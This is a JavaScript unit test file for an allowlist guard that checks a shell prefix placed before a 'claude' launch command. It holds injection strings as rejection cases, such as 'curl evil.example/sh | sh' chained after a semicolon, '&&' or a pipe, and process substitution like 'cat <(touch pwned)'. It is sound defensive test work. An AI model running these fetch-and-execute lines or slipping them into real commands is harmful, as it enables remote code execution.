// test/pre-launch-cmd-guard.test.js — unit tests for the preLaunchCmd guard.
//
// preLaunchCmd is concatenated, raw, in front of the `claude ...` command
// line before the whole string goes through `shell -c`. The guard is an
// allowlist of the character set the documented use case (aws-vault exec
// profile --) and its plausible analogues (env VAR=val, doas, an absolute
// binary path) actually need — everything else is refused, including
// constructs not on the maintainer's list of known-dangerous ones, because
// a per-metacharacter blacklist proved incomplete (process substitution
// <(...) / >(...) executed a subcommand using none of its blocked
// characters). See pre-launch-cmd-guard.js and .ai/contexts/ipc-bridge.md.
'use strict';

const test   = require('node:test');
const assert = require('node:assert/strict');
const path   = require('path');
const fs     = require('fs');
const os     = require('os');
const { spawnSync } = require('child_process');

const { validatePreLaunchCmd } = require('../pre-launch-cmd-guard');

// ── allowed: the documented use case and its analogues ──────────────────────

test('validatePreLaunchCmd: accepts the documented use case verbatim', () => {
  assert.deepEqual(validatePreLaunchCmd('aws-vault exec profile --'), { ok: true });
});

test('validatePreLaunchCmd: accepts a plain prefix with flags and no metacharacters', () => {
  assert.deepEqual(validatePreLaunchCmd('env -i HOME=/tmp'), { ok: true });
});

test('validatePreLaunchCmd: accepts env VAR=val form', () => {
  assert.equal(validatePreLaunchCmd('env AWS_PROFILE=prod').ok, true);
});

test('validatePreLaunchCmd: accepts a bare prefix binary with no args', () => {
  assert.equal(validatePreLaunchCmd('doas').ok, true);
});

test('validatePreLaunchCmd: accepts an absolute POSIX path to a binary', () => {
  assert.equal(validatePreLaunchCmd('/usr/local/bin/aws-vault exec profile --').ok, true);
});

test('validatePreLaunchCmd: accepts an absolute Windows path to a binary', () => {
  assert.equal(validatePreLaunchCmd('C:\\Users\\jb\\bin\\tool.exe --flag').ok, true);
});

// ── rejected: everything the blacklist used to enumerate, still rejected ────

test('validatePreLaunchCmd: rejects a semicolon-chained second command', () => {
  const out = validatePreLaunchCmd('true; curl evil.example/sh | sh');
  assert.equal(out.ok, false);
});

test('validatePreLaunchCmd: rejects &&-chaining', () => {
  assert.equal(validatePreLaunchCmd('true && curl evil.example/sh').ok, false);
});

test('validatePreLaunchCmd: rejects background execution via &', () => {
  assert.equal(validatePreLaunchCmd('curl evil.example/sh &').ok, false);
});

test('validatePreLaunchCmd: rejects a pipe', () => {
  assert.equal(validatePreLaunchCmd('true | curl evil.example/sh').ok, false);
});

test('validatePreLaunchCmd: rejects backtick command substitution', () => {
  assert.equal(validatePreLaunchCmd('echo `whoami`').ok, false);
});

test('validatePreLaunchCmd: rejects $(...) command substitution', () => {
  assert.equal(validatePreLaunchCmd('echo $(whoami)').ok, false);
});

test('validatePreLaunchCmd: rejects embedded newlines / carriage returns', () => {
  assert.equal(validatePreLaunchCmd('true\ncurl evil.example/sh').ok, false);
  assert.equal(validatePreLaunchCmd('true\r\ncurl evil.example/sh').ok, false);
});

// ── rejected: the gap the blacklist missed, and its sibling ─────────────────

test('validatePreLaunchCmd: rejects input process substitution <(...)', () => {
  assert.equal(validatePreLaunchCmd('cat <(touch pwned)').ok, false);
});

test('validatePreLaunchCmd: rejects output process substitution >(...)', () => {
  assert.equal(validatePreLaunchCmd('tee >(touch pwned)').ok, false);
});

test('validatePreLaunchCmd: rejects plain redirections', () => {
  assert.equal(validatePreLaunchCmd('true > /tmp/out').ok, false);
  assert.equal(validatePreLaunchCmd('true < /tmp/in').ok, false);
});

// ── narrowed on purpose: named as a cost, not treated as a vulnerability ────
//
// The old blacklist let these through unblocked; running them for real (both
// before and after this change) shows they never did anything beyond acting
// as whitespace in cmd.exe or PowerShell — the allowlist drops them as a
// side effect of being a closed set, not because they were found dangerous.

test('validatePreLaunchCmd: rejects Unicode line/paragraph separators', () => {
  for (const ch of ['\u2028', '\u2029', '\u0085', '\u000b', '\u000c']) {
    assert.equal(validatePreLaunchCmd('true' + ch + 'echo hi').ok, false, JSON.stringify(ch));
  }
});

// ── narrowed on purpose: named as a real capability loss ────────────────────
//
// The old blacklist allowed bare $VAR expansion and quoted strings (neither
// contains a blocked character). The allowlist drops both: $ and quote
// characters are not needed by the documented prefix or its analogues, and
// keeping them would require reasoning about brace/parameter-expansion
// forms per-shell again — the same trap that missed <(...).

test('validatePreLaunchCmd: no longer accepts bare $VAR expansion (capability loss, see PR body)', () => {
  assert.equal(validatePreLaunchCmd('env FOO=$BAR').ok, false);
});

test('validatePreLaunchCmd: no longer accepts single-quoted arguments (capability loss, see PR body)', () => {
  assert.equal(validatePreLaunchCmd("echo 'hello world'").ok, false);
});

// ── real shell execution proof ───────────────────────────────────────────────
//
// Regex assertions alone don't prove anything about what a real shell does
// with the string that gets through. This mirrors main.js's own
// concatenation (`pre + ' ' + claudeCmd`) and spawn shape
// (shell-profiles.js shellArgs: ['-l', '-i', '-c', cmd]) against the actual
// Git-for-Windows bash.exe used at runtime.

function findGitBash() {
  const candidates = [
    path.join(process.env.ProgramFiles || 'C:\\Program Files', 'Git', 'bin', 'bash.exe'),
    path.join(process.env['ProgramFiles(x86)'] || 'C:\\Program Files (x86)', 'Git', 'bin', 'bash.exe'),
  ];
  return candidates.find(p => fs.existsSync(p)) || null;
}

test('validatePreLaunchCmd + real bash: a rejected process-substitution prefix never reaches the shell, so its side effect never happens', (t) => {
  const bash = findGitBash();
  if (!bash) return t.skip('Git Bash not found on this machine');

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sb-prelaunch-'));
  try {
    const markerWin = path.join(tmp, 'pwned-marker.txt');
    const markerPosix = markerWin.split(path.sep).join('/');
    const pre = `cat <(touch ${markerPosix})`;

    const check = validatePreLaunchCmd(pre);
    assert.equal(check.ok, false, 'the guard must refuse this prefix');

    // Exactly what open-terminal does on an ok:false result: return early,
    // never build claudeCmd, never spawn a shell. Simulate that gate here so
    // the assertion is about the real, wired-together behaviour.
    if (check.ok) {
      const claudeCmd = pre + ' echo AFTER_CLAUDE';
      spawnSync(bash, ['-l', '-i', '-c', claudeCmd], { cwd: tmp, encoding: 'utf8' });
    }

    assert.equal(fs.existsSync(markerWin), false, 'refused prefix must not have created the marker file');
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('real bash: the documented use-case shape still executes normally once past the guard', (t) => {
  const bash = findGitBash();
  if (!bash) return t.skip('Git Bash not found on this machine');

  // Stand-in for "aws-vault exec profile --": a real binary (env(1), always
  // present under Git Bash) invoked in the same "prefix + claude invocation"
  // shape, so this proves the allowlist doesn't just parse — the resulting
  // string still runs as an ordinary shell command line.
  const pre = 'env FOO=bar';
  assert.equal(validatePreLaunchCmd(pre).ok, true);

  const claudeCmd = pre + ' echo AFTER_CLAUDE';
  const res = spawnSync(bash, ['-l', '-i', '-c', claudeCmd], { encoding: 'utf8' });
  assert.equal(res.status, 0);
  assert.match(res.stdout, /AFTER_CLAUDE/);
});
